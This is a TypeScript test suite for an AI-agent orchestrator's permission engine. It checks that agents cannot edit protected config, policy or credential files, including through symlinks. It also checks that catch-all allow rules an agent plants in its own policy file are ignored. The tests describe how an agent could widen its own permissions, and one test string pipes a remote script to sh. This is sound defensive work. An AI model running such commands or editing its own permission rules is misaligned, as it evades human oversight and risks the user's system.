        workspaceCwd: dir,
      }),
      replacePermissionPolicyFile(file, {
        ...held,
        agents: { ...held.agents, operator: { rules: [{ match: { pathPrefix: "docs" }, decision: "allow" }] } },
      }),
    ]);

    // Whichever went second read the other's file first, so the result is always a valid
    // document rather than a half-written one - and the run's own grant is never lost to a
    // reader that had not seen it, because both took the same lock.
    const after = await readPermissionPolicyFile(file);
    expect(Object.keys(after.agents).length).toBeGreaterThanOrEqual(2);
    expect(after.agents["claude-local"]?.rules).toHaveLength(1);
  });
});

/**
 * C4-01. With no `workspace:` the config directory is the run's workspace, and the default
 * policy allows edits inside it: an agent could edit the sidecar, write a catch-all `allow`,
 * and have every later `execute` approved without anyone being asked. So ORCA's own files go
 * ahead of every rule, and nothing a rule says reaches them.
 */
describe("protected paths", () => {
  interface Fixture {
    dir: string;
    protectedPaths: ProtectedPaths;
  }

  /** A config directory laid out the way `orca serve` leaves one, with a project beside it. */
  async function configDir(): Promise<Fixture> {
    const dir = await workspace();
    await mkdir(join(dir, "auth"));
    await mkdir(join(dir, ".orca", "private-execution"), { recursive: true });
    await mkdir(join(dir, ".orca", "runs"));
    await mkdir(join(dir, "src"));
    await mkdir(join(dir, "sub"));
    await writeFile(join(dir, "auth", "local-client.token"), "orca1.owner.secret", "utf8");
    await writeFile(join(dir, ".orca", "private-execution", ".execution-key"), "key", "utf8");
    await writeFile(join(dir, "orca.config.yaml"), "version: 1\n", "utf8");
    await writeFile(permissionPolicyPath(dir), `{"version":1,"agents":{}}`, "utf8");
    await writeFile(join(dir, "src", "a.ts"), "", "utf8");
    return {
      dir,
      protectedPaths: {
        readOnly: [join(dir, "orca.config.yaml"), permissionPolicyPath(dir), join(dir, ".orca")],
        noAccess: [join(dir, "auth"), join(dir, ".orca", "private-execution")],
        agentAreas: [join(dir, ".orca", "work")],
      },
    };
  }

  const at = (policy: PermissionPolicy, f: Fixture, kind: string, ...paths: string[]) =>
    decidePermission(policy, req(kind, `${kind} ${paths.join(" ")}`, ...paths), {
      workspaceCwd: f.dir,
      protectedPaths: f.protectedPaths,
    });

  it("denies changing the sidecar, the config, auth and the store, though they are inside the workspace", async () => {
    const f = await configDir();
    const { dir } = f;
    for (const path of [
      permissionPolicyPath(dir),
      join(dir, "orca.config.yaml"),
      join(dir, "auth", "local-client.token"),
      join(dir, ".orca", "runs", "r.jsonl"),
      join(dir, ".orca"),
    ])
      for (const kind of ["edit", "delete", "move", "execute", "other"])
        expect(at(bareEffective, f, kind, path), `${kind} ${path}`).toBe("deny");
    // A file about to be created is as protected as one that exists.
    expect(at(bareEffective, f, "edit", join(dir, "auth", "new.token"))).toBe("deny");
    expect(at(bareEffective, f, "edit", join(dir, ".orca", "private-execution", "new"))).toBe("deny");
    // A relative location is workspace-relative, as a rule's is.
    expect(at(bareEffective, f, "edit", "orca.permissions.json")).toBe("deny");
    // A move is denied for either end.
    expect(at(bareEffective, f, "move", join(dir, "src", "a.ts"), permissionPolicyPath(dir))).toBe("deny");
    // Deleting or moving a directory that holds them takes them with it.
    expect(at(bareEffective, f, "delete", dir)).toBe("deny");
    expect(at(bareEffective, f, "move", dir, `${dir}-old`)).toBe("deny");
    expect(at(bareEffective, f, "delete", join(dir, "src"))).toBe("allow");
    // The same policy without the protection allows every one of these - which was the bug.
    expect(decidePermission(bareEffective, req("edit", "Edit", permissionPolicyPath(dir)), { workspaceCwd: dir })).toBe(
      "allow",
    );
  });

  it("denies reading auth and the store's keys, and leaves the other reads to the policy", async () => {
    const f = await configDir();
    const { dir } = f;
    expect(at(bareEffective, f, "read", join(dir, "auth", "local-client.token"))).toBe("deny");
    expect(at(bareEffective, f, "search", join(dir, "auth"))).toBe("deny");
    expect(at(bareEffective, f, "read", join(dir, ".orca", "private-execution", ".execution-key"))).toBe("deny");
    // Read-only is not unreadable: the config, the sidecar and the run history are the policy's.
    expect(at(bareEffective, f, "read", permissionPolicyPath(dir))).toBe("allow");
    expect(at(bareEffective, f, "read", join(dir, "orca.config.yaml"))).toBe("allow");
    expect(at(bareEffective, f, "read", join(dir, ".orca", "runs", "r.jsonl"))).toBe("allow");
  });

  it("still lets an agent change the project's own files beside them", async () => {
    const f = await configDir();
    const { dir } = f;
    expect(at(bareEffective, f, "edit", join(dir, "src", "a.ts"))).toBe("allow");
    expect(at(bareEffective, f, "delete", join(dir, "src", "a.ts"))).toBe("allow");
    // Compared segment by segment, not as a string prefix.
    expect(at(bareEffective, f, "edit", join(dir, ".orca-notes", "plan.md"))).toBe("allow");
    expect(at(bareEffective, f, "edit", join(dir, "authors.md"))).toBe("allow");
    expect(at(bareEffective, f, "edit", `${permissionPolicyPath(dir)}.bak`)).toBe("allow");
    // And what the policy asks about, it still asks about.
    expect(at(bareEffective, f, "execute", dir)).toBe("ask");
  });

  it("keeps explicit authority paths protected inside the store's agent areas", async () => {
    const dir = await workspace();
    const area = join(dir, "work");
    const configDir = join(area, "project");
    await mkdir(configDir, { recursive: true });
    const config = join(configDir, "orca.config.yaml");
    const sidecar = permissionPolicyPath(configDir);
    const protectedPaths: ProtectedPaths = {
      // Store first as well: exempting it must continue checking the explicit files.
      readOnly: [dir, config, sidecar],
      noAccess: [],
      agentAreas: [area],
    };
    for (const path of [config, sidecar]) {
      expect(protectedPathFor(path, "write", protectedPaths)).toBe(path);
      expect(protectedPathFor(path, "remove", protectedPaths)).toBe(path);
    }
    expect(protectedPathFor(configDir, "remove", protectedPaths)).toBe(config);
    expect(protectedPathFor(join(configDir, "spec.md"), "write", protectedPaths)).toBeUndefined();
    const alias = join(dir, "config-link");
    await symlink(configDir, alias, "junction");
    const linkedConfig = join(alias, "orca.config.yaml");
    expect(protectedPathFor(config, "write", { ...protectedPaths, readOnly: [dir, linkedConfig] })).toBe(linkedConfig);
  });

  it("leaves the store's agent areas to the policy, where the shipped workflows write deliverables", async () => {
    const f = await configDir();
    const { dir } = f;
    const deliverable = join(dir, ".orca", "work", "auth-api", ".orca-attempts", "run", "step", "spec.md");
    expect(at(bareEffective, f, "edit", deliverable)).toBe("allow");
    expect(at(bareEffective, f, "delete", join(dir, ".orca", "work", "auth-api"))).toBe("allow");
    // The rest of the store is still ORCA's, and so is the store as a whole.
    expect(at(bareEffective, f, "edit", join(dir, ".orca", "workers.json"))).toBe("deny");
    expect(at(bareEffective, f, "delete", join(dir, ".orca"))).toBe("deny");
    // A link standing in for the area does not carry the rest of the store with it.
    await symlink(join(dir, ".orca"), join(dir, ".orca", "work"), "junction");
    expect(at(bareEffective, f, "edit", join(dir, ".orca", "work", "runs", "r.jsonl"))).toBe("deny");
  });

  it("cannot be reached through `..` or through a directory link", async () => {
    const f = await configDir();
    const { dir } = f;
    expect(at(bareEffective, f, "edit", join(dir, "sub") + "/../orca.permissions.json")).toBe("deny");
    expect(at(bareEffective, f, "edit", "sub/../orca.permissions.json")).toBe("deny");
    // A junction on Windows, which needs no privilege; the type is ignored elsewhere.
    await symlink(join(dir, "auth"), join(dir, "creds"), "junction");
    await symlink(join(dir, ".orca"), join(dir, "notes"), "junction");
    expect(at(bareEffective, f, "read", join(dir, "creds", "local-client.token"))).toBe("deny");
    expect(at(bareEffective, f, "edit", join(dir, "notes", "runs", "r.jsonl"))).toBe("deny");
    // `..` is taken from where the link leads, so creds/.. is the config directory.
    expect(at(bareEffective, f, "edit", join(dir, "creds") + "/../orca.permissions.json")).toBe("deny");
  });

  it.skipIf(process.platform === "win32")("cannot be reached through a file symlink", async () => {
    const f = await configDir();
    await symlink(permissionPolicyPath(f.dir), join(f.dir, "src", "policy.json"));
    expect(at(bareEffective, f, "edit", join(f.dir, "src", "policy.json"))).toBe("deny");
  });

  it.skipIf(process.platform === "win32")(
    "cannot be created through a link whose target does not exist yet (#706 B05)",
    async () => {
      const f = await configDir();
      const sidecar = permissionPolicyPath(f.dir);
      await rm(sidecar);
      // A write that creates a file follows a dangling link and creates its target, so the link
      // is judged by where it leads, relative targets and chains of links included.
      await symlink("../orca.permissions.json", join(f.dir, "src", "relative.json"));
      await symlink(sidecar, join(f.dir, "src", "absolute.json"));
      await symlink(join(f.dir, "src", "relative.json"), join(f.dir, "src", "chained.json"));
      await symlink(join(f.dir, ".orca", "runs", "new", "log.jsonl"), join(f.dir, "src", "deep.jsonl"));
      for (const name of ["relative.json", "absolute.json", "chained.json", "deep.jsonl"]) {
        expect(at(bareEffective, f, "edit", join(f.dir, "src", name)), name).toBe("deny");
        expect(protectedPathFor(join(f.dir, "src", name), "write", f.protectedPaths), name).toBeDefined();
      }
      // A dangling link to somewhere free is still free.
      await symlink(join(f.dir, "src", "later.ts"), join(f.dir, "src", "free.ts"));
      expect(at(bareEffective, f, "edit", join(f.dir, "src", "free.ts"))).toBe("allow");
    },
  );

  it.skipIf(process.platform === "win32")(
    "judges a removal by the directory entry, and a write by both the entry and where it leads (#706 review)",
    async () => {
      const f = await configDir();
      const sidecar = permissionPolicyPath(f.dir);
      // Removing a link to the sidecar removes the link, not the sidecar.
      await symlink(sidecar, join(f.dir, "src", "to-sidecar.json"));
      expect(protectedPathFor(join(f.dir, "src", "to-sidecar.json"), "remove", f.protectedPaths)).toBeUndefined();
      expect(protectedPathFor(join(f.dir, "src", "to-sidecar.json"), "write", f.protectedPaths)).toBe(sidecar);

      // A sidecar that is itself a link: its entry is protected for every mutation, and so is
      // the file it leads to, however it is named.
      const g = await configDir();
      const real = join(g.dir, "src", "policy.json");
      await writeFile(real, `{"version":1,"agents":{}}`, "utf8");
      await rm(permissionPolicyPath(g.dir));
      await symlink(real, permissionPolicyPath(g.dir));
      for (const access of ["write", "remove"] as const) {
        expect(protectedPathFor(permissionPolicyPath(g.dir), access, g.protectedPaths), access).toBeDefined();
        expect(protectedPathFor(real, access, g.protectedPaths), access).toBeDefined();
      }
      expect(at(bareEffective, g, "move", permissionPolicyPath(g.dir), join(g.dir, "src", "x.json"))).toBe("deny");
    },
  );

  it.skipIf(process.platform === "win32")("treats a path it cannot resolve as protected, absence aside", async () => {
    const f = await configDir();
    // A loop of links, and a path below a regular file: neither can be shown to be free.
    await symlink(join(f.dir, "src", "loop-b"), join(f.dir, "src", "loop-a"));
    await symlink(join(f.dir, "src", "loop-a"), join(f.dir, "src", "loop-b"));
    const below = join(f.dir, "src", "a.ts", "x");
    for (const path of [join(f.dir, "src", "loop-a"), below]) {
      for (const access of ["read", "write"] as const)
        expect(protectedPathFor(path, access, f.protectedPaths), `${access} ${path}`).toBe(path);
      expect(at(bareEffective, f, "edit", path)).toBe("deny");
    }
    // Removing the looping link itself only removes that entry, which is free.
    expect(protectedPathFor(join(f.dir, "src", "loop-a"), "remove", f.protectedPaths)).toBeUndefined();
    // Plain absence is an answer: a new file in the workspace is free.
    expect(protectedPathFor(join(f.dir, "src", "new", "file.ts"), "write", f.protectedPaths)).toBeUndefined();
  });

  it.skipIf(process.platform === "win32")("existingDirectoryWithin says no on any doubt", async () => {
    const f = await configDir();
    expect(existingDirectoryWithin(join(f.dir, "src"), f.dir)).toBe(true);
    expect(existingDirectoryWithin(f.dir, f.dir)).toBe(true);
    await symlink(join(f.dir, "src"), join(f.dir, "src-link"), "junction");
    expect(existingDirectoryWithin(join(f.dir, "src-link"), f.dir)).toBe(true);
    expect(existingDirectoryWithin(f.dir, join(f.dir, "src"))).toBe(false);
    // A directory that does not exist yet is not inside anything, and neither is a file.
    expect(existingDirectoryWithin(join(f.dir, "src", "not-yet"), f.dir)).toBe(false);
    expect(existingDirectoryWithin(join(f.dir, "src", "a.ts"), f.dir)).toBe(false);
    expect(existingDirectoryWithin(join(f.dir, "src"), join(f.dir, "missing"))).toBe(false);
    await symlink(join(f.dir, "src", "loop-b"), join(f.dir, "src", "loop-a"));
    await symlink(join(f.dir, "src", "loop-a"), join(f.dir, "src", "loop-b"));
    expect(existingDirectoryWithin(join(f.dir, "src", "loop-a"), f.dir)).toBe(false);
    // A link pointing outside is judged by where it leads.
    const outside = await workspace();
    await symlink(outside, join(f.dir, "src", "away"), "junction");
    expect(existingDirectoryWithin(join(f.dir, "src", "away"), f.dir)).toBe(false);
  });

  it("is not overridden by any rule: configured, written to the sidecar, or `default: allow`", async () => {
    const f = await configDir();
    const sidecar = permissionPolicyPath(f.dir);
    const sandbox = AgentSpecSchema.parse({ id: "s", command: "x", permissions: { default: "allow" } });
    expect(at(await loadEffectivePermissionPolicy(sandbox, []), f, "edit", sidecar)).toBe("deny");
    const configured = AgentSpecSchema.parse({
      id: "c",
      command: "x",
      permissions: { rules: [{ match: { kind: "edit", path: "orca.permissions.json" }, decision: "allow" }] },
    });
    expect(at(await loadEffectivePermissionPolicy(configured, []), f, "edit", sidecar)).toBe("deny");
    // Somebody answered "always" to an edit of the sidecar itself, before this existed.
    await recordAlwaysDecision({
      file: sidecar,
      agentId: "a",
      request: req("edit", "Edit", sidecar),
      decision: "allow",
      workspaceCwd: f.dir,
    });
    const written = AgentSpecSchema.parse({ id: "a", command: "x", permissions: { default: "ask" } });
    expect(at(await loadEffectivePermissionPolicy(written, [sidecar]), f, "edit", sidecar)).toBe("deny");
  });

  it("says why when it refuses through the resolve path", async () => {
    const f = await configDir();
    const request = {
      sessionId: "s",
      toolCall: { toolCallId: "t", title: "Edit", kind: "edit", locations: [{ path: permissionPolicyPath(f.dir) }] },
      options: [
        { optionId: "yes", name: "Allow", kind: "allow_once" },
        { optionId: "no", name: "Reject", kind: "reject_once" },
      ],
    } as never;
    const resolved = await resolvePermission(bareEffective, {
      request,
      scope: { workspaceCwd: f.dir, protectedPaths: f.protectedPaths },
    });
    expect(resolved.decision).toBe("deny:protected");
    expect(resolved.response.outcome).toEqual({ outcome: "selected", optionId: "no" });
  });

  it("answers the fs handlers' question the same way", async () => {
    const f = await configDir();
    const token = join(f.dir, "auth", "local-client.token");
    expect(protectedPathFor(token, "read", f.protectedPaths)).toBe(join(f.dir, "auth"));
    expect(protectedPathFor(permissionPolicyPath(f.dir), "read", f.protectedPaths)).toBeUndefined();
    expect(protectedPathFor(permissionPolicyPath(f.dir), "write", f.protectedPaths)).toBe(permissionPolicyPath(f.dir));
    expect(protectedPathFor(join(f.dir, "src", "a.ts"), "write", f.protectedPaths)).toBeUndefined();
    expect(protectedPathFor(token, "read", undefined)).toBeUndefined();
  });
});

/**
 * C4-01's second half. Every rule ORCA writes into the sidecar is derived and scoped, so an
 * `allow` there that says nothing about what it allows is far likelier to be an agent's work
 * than a person's: it is ignored, and a wildcard belongs in `orca.config.yaml`.
 */
describe("wildcards in the sidecar", () => {
  it("knows a wildcard allow when it sees one", () => {
    const wild: PermissionRule["match"][] = [
      {},
      { kind: "execute" },
      { kind: "execute", titlePattern: ".*" },
      { kind: "execute", titlePattern: "" },
      { kind: "execute", scope: "workspace" },
      { kind: "execute", path: "." },
      { kind: "read" },
      { kind: "read", scope: "outside-workspace" },
      { kind: "edit", pathPrefix: "." },
      { kind: "delete", path: "./" },
      { titlePattern: "^npm test$" },
      { scope: "workspace" },
      // An execute allow, however it is narrowed: its title is what the agent shows (#702 review).
      { kind: "execute", titlePattern: "^npm test$" },
      { kind: "execute", command: "npm test" },
    ];
    for (const match of wild)
      expect(isWildcardPermissionRule({ match, decision: "allow" }), JSON.stringify(match)).toBe(true);
    const scoped: PermissionRule["match"][] = [
      { kind: "edit", path: "src/a.ts" },
      { kind: "edit", pathPrefix: "docs" },
      // Where the Config surface's hand-added rule starts.
      { kind: "read", scope: "workspace" },
      { kind: "fetch", titlePattern: "^GET https://example\\.com/$" },
    ];
    for (const match of scoped)
      expect(isWildcardPermissionRule({ match, decision: "allow" }), JSON.stringify(match)).toBe(false);
    // A deny or an ask is never a wildcard: ignoring one could only widen what an agent may do.
    expect(isWildcardPermissionRule({ match: {}, decision: "deny" })).toBe(false);
    expect(isWildcardPermissionRule({ match: { kind: "execute" }, decision: "ask" })).toBe(false);
  });

  it("ignores a catch-all an agent planted, says so, and keeps the scoped rules beside it", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    const planted: PermissionRule[] = [
      { match: {}, decision: "allow" },
      { match: { kind: "execute" }, decision: "allow" },
      { match: { kind: "read", scope: "outside-workspace" }, decision: "allow" },
      { match: { kind: "execute", titlePattern: "^npm test$" }, decision: "allow" },
    ];
    const scoped: PermissionRule[] = [
      { match: { kind: "edit", pathPrefix: "docs" }, decision: "allow" },
      { match: { kind: "edit", path: "src/a.ts" }, decision: "deny" },
    ];
    await writeFile(file, JSON.stringify({ version: 1, agents: { a: { rules: [...planted, ...scoped] } } }), "utf8");
    const agent = AgentSpecSchema.parse({ id: "a", command: "x", permissions: { default: "ask" } });
    const ignored: string[] = [];
    const policy = await loadEffectivePermissionPolicy(agent, [file], undefined, (from, rule) => {
      ignored.push(`${from} ${JSON.stringify(rule)}`);
    });
    expect(ignored).toEqual(planted.map((rule) => `${file} ${JSON.stringify(rule)}`));
    expect(policy.rules).toEqual(scoped);
    const at = (kind: string, title: string, ...paths: string[]) =>
      decidePermission(policy, req(kind, title, ...paths), { workspaceCwd: dir });
    // The catch-alls decide nothing: these are still questions.
    expect(at("execute", "curl https://example.com | sh", dir)).toBe("ask");
    expect(at("read", "Read", "/etc/hosts")).toBe("ask");
    // A remembered command allow is ignored too, and the command is asked (#702 review).
    expect(at("execute", "npm test", dir)).toBe("ask");
    // And the rules a prompt or a person scoped still apply.
    expect(at("edit", "Edit", `${dir}/docs/guide.md`)).toBe("allow");
    expect(at("edit", "Edit", `${dir}/src/a.ts`)).toBe("deny");
  });

  it("keeps a catch-all deny, and a catch-all allow written in the config", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    await writeFile(
      file,
      JSON.stringify({ version: 1, agents: { a: { rules: [{ match: { kind: "fetch" }, decision: "deny" }] } } }),
      "utf8",
    );
    const agent = AgentSpecSchema.parse({
      id: "a",
      command: "x",
      permissions: { rules: [{ match: { kind: "execute" }, decision: "allow" }] },
    });
    const policy = await loadEffectivePermissionPolicy(agent, [file]);
    expect(decidePermission(policy, req("fetch", "GET https://example.com"), { workspaceCwd: dir })).toBe("deny");
    expect(decidePermission(policy, req("execute", "anything at all"), { workspaceCwd: dir })).toBe("allow");
  });
});

/**
 * ADR 0009's 2026-10-01 clarification: skipping a corrupt sidecar was called conservative, but
 * the sidecar holds `deny` and `ask` rules too, and dropping one let a default `allow` through.
 * Every `allow` decided after a sidecar that could not be read is now an `ask`.
 */
describe("an unreadable sidecar", () => {
  const skip = () => undefined;

  it("turns the allows decided after it into asks, and allows no command at all", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    const agent = AgentSpecSchema.parse({
      id: "a",
      command: "x",
      permissions: { rules: [{ match: { kind: "execute", titlePattern: "^npm test$" }, decision: "allow" }] },
    });
    const request = req("edit", "Edit src/generated.ts", `${dir}/src/generated.ts`);
    const decide = async (r: never) =>
      decidePermission(await loadEffectivePermissionPolicy(agent, [file], skip), r, { workspaceCwd: dir });
    // A recorded "never" for that file, which a readable sidecar enforces over the default allow.
    await recordAlwaysDecision({ file, agentId: "a", request, decision: "deny", workspaceCwd: dir });
    expect(await decide(request)).toBe("deny");

    await writeFile(file, "{ this is not json", "utf8");
    // The deny cannot be read, so the default allow behind it does not get to decide either.
    expect(await decide(request)).toBe("ask");
    expect(await decide(req("read", "Read", `${dir}/src/a.ts`))).toBe("ask");
    // The configured rule comes before the sidecar, but the file might have held a command
    // restriction, so a command is asked rather than allowed (#702 review).
    expect(await decide(req("execute", "npm test", dir))).toBe("ask");
    // And a caller with no `onUnreadable` still gets the error rather than a policy.
    await expect(loadEffectivePermissionPolicy(agent, [file])).rejects.toMatchObject({ code: "CONFIG_INVALID" });
  });

  it("caps an explicit `default: allow` as well", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    await writeFile(file, "{ this is not json", "utf8");
    const sandbox = AgentSpecSchema.parse({ id: "s", command: "x", permissions: { default: "allow" } });
    const policy = await loadEffectivePermissionPolicy(sandbox, [file], skip);
    expect(policy.default).toBe("ask");
    expect(decidePermission(policy, req("execute", "make"), { workspaceCwd: dir })).toBe("ask");
  });

  it("leaves a sidecar read before it as it was, and caps one read after it", async () => {
    const dir = await workspace();
    const first = join(dir, "one.json");
    const broken = join(dir, "two.json");
    const last = join(dir, "three.json");
    const grant = (path: string) =>
      JSON.stringify({ version: 1, agents: { a: { rules: [{ match: { kind: "edit", path }, decision: "allow" }] } } });
    await writeFile(first, grant("src/b.ts"), "utf8");
    await writeFile(broken, "{", "utf8");
    await writeFile(last, grant("src/c.ts"), "utf8");
    const agent = AgentSpecSchema.parse({ id: "a", command: "x", permissions: { default: "ask" } });
    const policy = await loadEffectivePermissionPolicy(agent, [first, broken, last], skip);
    expect(decidePermission(policy, req("edit", "Edit", `${dir}/src/b.ts`), { workspaceCwd: dir })).toBe("allow");
    expect(decidePermission(policy, req("edit", "Edit", `${dir}/src/c.ts`), { workspaceCwd: dir })).toBe("ask");
  });
});

/**
 * #702: a standing rule has a lifetime, ORCA's own rule is the only standing grant, and an
 * automatic allow never hands the agent a remembered one. Each case below is re-read per ask
 * the way `openAcpSession` does, so "the next ask" is the very next evaluation.
 */
describe("rule lifetimes and one-time selection (#702)", () => {
  const agent = AgentSpecSchema.parse({
    id: "claude-local",
    command: "claude-code-acp",
    permissions: { default: "ask", rules: [] },
  });
  const T0 = Date.parse("2026-11-23T10:00:00.000Z");
  const HOUR = 60 * 60 * 1000;

  it("decides by a timed rule until it expires, then asks again, without anybody editing the file", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    const request = req("edit", "Edit src/a.ts", `${dir}/src/a.ts`);
    await recordAlwaysDecision({
      file,
      agentId: agent.id,
      request,
      decision: "allow",
      workspaceCwd: dir,
      expiresAt: new Date(T0 + HOUR).toISOString(),
      now: () => new Date(T0),
    });
    const at = async (ms: number) =>
      decidePermission(await loadEffectivePermissionPolicy(agent, [file], undefined, undefined, () => ms), request, {
        workspaceCwd: dir,
      });
    expect(await at(T0 + HOUR - 1)).toBe("allow");
    // The instant itself is already out.
    expect(await at(T0 + HOUR)).toBe("ask");
    expect(await at(T0 + 2 * HOUR)).toBe("ask");
    // The expired rule stays in the file, with its lifetime, for whoever reads the diff.
    expect((await readPermissionPolicyFile(file)).agents[agent.id]?.rules[0]).toMatchObject({
      expiresAt: "2026-11-23T11:00:00.000Z",
    });
  });

  it("lets an expired deny stop deciding too: the person chose how long it held", async () => {
    const doc = {
      version: 1 as const,
      agents: {
        a: {
          rules: [
            {
              match: { kind: "edit" as const, path: "src/a.ts" },
              decision: "deny" as const,
              expiresAt: "2026-11-23T11:00:00.000Z",
            },
          ],
        },
      },
    };
    expect(permissionOverlayFor(doc, "a", undefined, T0)).toHaveLength(1);
    expect(permissionOverlayFor(doc, "a", undefined, T0 + HOUR)).toEqual([]);
  });

  it("revokes by removal: the next ask after a rule is deleted is asked, not answered from a cache", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    const request = req("edit", "Edit src/a.ts", `${dir}/src/a.ts`);
    await recordAlwaysDecision({ file, agentId: agent.id, request, decision: "allow", workspaceCwd: dir });
    const policy = () => loadEffectivePermissionPolicy(agent, [file]);
    expect((await resolvePermission(await policy(), { request, scope: { workspaceCwd: dir } })).response).toEqual({
      outcome: { outcome: "selected", optionId: "once" },
    });
    await replacePermissionPolicyFile(file, { version: 1, agents: {} });
    expect(decidePermission(await policy(), request, { workspaceCwd: dir })).toBe("ask");
  });

  it("extends an equivalent rule in place rather than appending a twin, and never shortens one", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    const request = req("edit", "Edit src/a.ts", `${dir}/src/a.ts`);
    const opts = {
      file,
      agentId: "a",
      request,
      decision: "allow" as const,
      workspaceCwd: dir,
      now: () => new Date(T0),
    };
    const hour = new Date(T0 + HOUR).toISOString();
    const day = new Date(T0 + 24 * HOUR).toISOString();
    expect((await recordAlwaysDecision({ ...opts, expiresAt: hour })).added).toHaveLength(1);
    // Longer: extended in place, still one line.
    expect((await recordAlwaysDecision({ ...opts, expiresAt: day })).added).toHaveLength(1);
    let rules = (await readPermissionPolicyFile(file)).agents["a"]?.rules;
    expect(rules).toHaveLength(1);
    expect(rules?.[0]?.expiresAt).toBe(day);
    // Shorter: the longer grant already covers it, so nothing is written.
    const shorter = await recordAlwaysDecision({ ...opts, expiresAt: hour });
    expect(shorter.added).toEqual([]);
    expect(shorter.alreadyPresent).toHaveLength(1);
    // Until removed: outlasts any timed rule, so it replaces the lifetime.
    expect((await recordAlwaysDecision(opts)).added).toHaveLength(1);
    rules = (await readPermissionPolicyFile(file)).agents["a"]?.rules;
    expect(rules).toHaveLength(1);
    expect(rules?.[0]?.expiresAt).toBeUndefined();
    // And a timed answer after that changes nothing.
    expect((await recordAlwaysDecision({ ...opts, expiresAt: day })).alreadyPresent).toHaveLength(1);
  });

  it("renews an expired rule in place", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    const request = req("edit", "Edit src/a.ts", `${dir}/src/a.ts`);
    const base = { file, agentId: "a", request, decision: "allow" as const, workspaceCwd: dir };
    await recordAlwaysDecision({ ...base, expiresAt: new Date(T0 + HOUR).toISOString(), now: () => new Date(T0) });
    const later = T0 + 3 * HOUR;
    const renewed = await recordAlwaysDecision({
      ...base,
      expiresAt: new Date(later + HOUR).toISOString(),
      now: () => new Date(later),
    });
    expect(renewed.added).toHaveLength(1);
    const rules = (await readPermissionPolicyFile(file)).agents["a"]?.rules;
    expect(rules).toHaveLength(1);
    expect(rules?.[0]).toMatchObject({
      addedAt: new Date(later).toISOString(),
      expiresAt: new Date(later + HOUR).toISOString(),
    });
  });

  it("refuses a lifetime that is already over, and writes nothing", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    await expect(
      recordAlwaysDecision({
        file,
        agentId: "a",
        request: req("edit", "Edit src/a.ts", `${dir}/src/a.ts`),
        decision: "allow",
        workspaceCwd: dir,
        expiresAt: new Date(T0).toISOString(),
        now: () => new Date(T0),
      }),
    ).rejects.toMatchObject({ code: "CONFIG_INVALID" });
    await expect(readFile(file, "utf8")).rejects.toMatchObject({ code: "ENOENT" });
  });

  it("refuses a sidecar whose expiresAt is not an instant, rather than read it as forever", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    await writeFile(
      file,
      JSON.stringify({
        version: 1,
        agents: { a: { rules: [{ match: { kind: "edit", path: "src/a.ts" }, decision: "allow", expiresAt: "soon" }] } },
      }),
    );
    await expect(readPermissionPolicyFile(file)).rejects.toMatchObject({ code: "CONFIG_INVALID" });
  });

  it("writes the lifetime after the provenance, in the writer's fixed key order", async () => {
    const dir = await workspace();
    const file = permissionPolicyPath(dir);
    await recordAlwaysDecision({
      file,
      agentId: "a",
      request: req("edit", "Edit src/a.ts", `${dir}/src/a.ts`),
      decision: "allow",
      workspaceCwd: dir,
      expiresAt: "2026-11-24T10:00:00.000Z",
      now: () => new Date(T0),
    });
    const rule = JSON.parse(await readFile(file, "utf8")).agents.a.rules[0];
    expect(Object.keys(rule)).toEqual(["match", "decision", "addedAt", "grantedFor", "expiresAt"]);
  });

  it("answers a rule-matched allow with the one-time option only, never the remembered one", async () => {
    const policy: PermissionPolicy = { default: "ask", rules: [{ match: { kind: "read" }, decision: "allow" }] };
    const request = (options: { optionId: string; kind: string }[]) =>
      ({
        sessionId: "s",
        toolCall: { toolCallId: "t", title: "Read a", kind: "read" },
        options: options.map((o) => ({ ...o, name: o.optionId })),
      }) as never;
    // Offered in the order agents commonly use, remembered first.
    expect(
      await resolvePermission(policy, {
        request: request([
          { optionId: "always", kind: "allow_always" },
          { optionId: "once", kind: "allow_once" },
        ]),
      }),
    ).toEqual({ response: { outcome: { outcome: "selected", optionId: "once" } }, decision: "allow" });
    expect(
      await resolvePermission(policy, {
        request: request([
          { optionId: "always", kind: "allow_always" },
          { optionId: "no", kind: "reject_once" },
        ]),
      }),
    ).toEqual({ response: { outcome: { outcome: "cancelled" } }, decision: "allow:no-one-time-option" });
  });
});
